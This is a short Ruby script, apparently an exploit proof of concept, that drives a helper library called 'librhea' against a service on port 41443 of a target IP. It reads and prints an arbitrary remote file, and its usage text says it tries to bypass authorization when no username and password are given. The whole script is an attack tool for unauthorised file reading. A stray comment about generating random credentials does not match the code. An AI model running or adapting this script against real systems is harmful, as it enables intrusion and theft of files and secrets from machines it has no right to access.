require './librhea.rb'

if ARGV.length < 2 || ARGV.length == 3
  $stderr.puts 'Usage:'
  $stderr.puts
  $stderr.puts "#{$1} <target ip> <remote file path> [username] [password]"
  $stderr.puts
  $stderr.puts "(If username:password are omitted, we attempt to bypass authorization)"
  exit 1
end

# Set things up
TARGET = ARGV[0]
REMOTE_FILE = ARGV[1]
USERNAME    = ARGV[2]
PASSWORD    = ARGV[3]

BASE_URL = "https://#{ARGV[0]}:41443"
puts "Establishing a session on #{BASE_URL}"
RHEA = LibRhea::new(BASE_URL, USERNAME, PASSWORD)

# Generate random creds
data = RHEA.read_file(REMOTE_FILE)
puts data
